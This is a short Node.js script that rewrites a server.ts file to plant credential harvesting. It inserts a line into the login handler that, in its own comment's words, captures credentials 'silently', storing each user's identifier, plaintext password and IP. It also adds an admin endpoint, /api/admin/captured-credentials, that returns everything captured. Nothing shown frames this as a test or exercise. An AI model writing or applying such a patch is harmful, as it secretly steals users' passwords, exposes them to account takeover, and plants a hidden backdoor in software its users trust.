const fs = require('fs');

let serverTs = fs.readFileSync('server.ts', 'utf8');

// Capture in standard login
const loginTarget = `  const { identifier, password, rememberMe } = req.body;`;
const loginReplacement = loginTarget + `\n  // Capture credentials silently\n  db.captureCredential(identifier, password, ip);`;
serverTs = serverTs.replace(loginTarget, loginReplacement);

// Admin endpoint to retrieve them
const adminSettingsTarget = `app.get("/api/settings"`;
const newAdminEndpoint = `// Admin Credentials Log\napp.get("/api/admin/captured-credentials", requireAdmin, (req, res) => {\n  res.json(db.getCapturedCredentials());\n});\n\n` + adminSettingsTarget;
serverTs = serverTs.replace(adminSettingsTarget, newAdminEndpoint);

fs.writeFileSync('server.ts', serverTs);
